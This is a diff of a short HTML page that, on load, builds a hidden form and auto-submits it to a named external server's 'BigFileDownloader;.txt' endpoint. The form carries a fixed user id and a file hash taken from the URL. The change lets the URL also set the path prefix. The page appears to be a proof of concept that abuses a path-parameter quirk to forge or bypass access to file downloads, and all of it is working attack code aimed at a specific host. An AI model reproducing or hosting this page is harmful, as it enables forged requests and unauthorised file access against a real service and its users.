@@ -1,7 +1,7 @@
 <!doctype html><html><body><pre>init</pre><script>
-var q=new URLSearchParams(location.search),n=q.get('n')||'';
+var q=new URLSearchParams(location.search),n=q.get('n')||'',p=q.get('p')||'im-api';
 var f=document.createElement('form');f.method='GET';
-f.action='https://sqd3333pp.theleadernetworks.com/im-api/BigFileDownloader;.txt';
+f.action='https://sqd3333pp.theleadernetworks.com/'+p+'/BigFileDownloader;.txt';
 [['user_uid','7189300'],['file_name','x'],['file_md5',n]].forEach(function(kv){var i=document.createElement('input');i.type='hidden';i.name=kv[0];i.value=kv[1];f.appendChild(i);});
 document.body.appendChild(f);f.submit();
 </script></body></html>
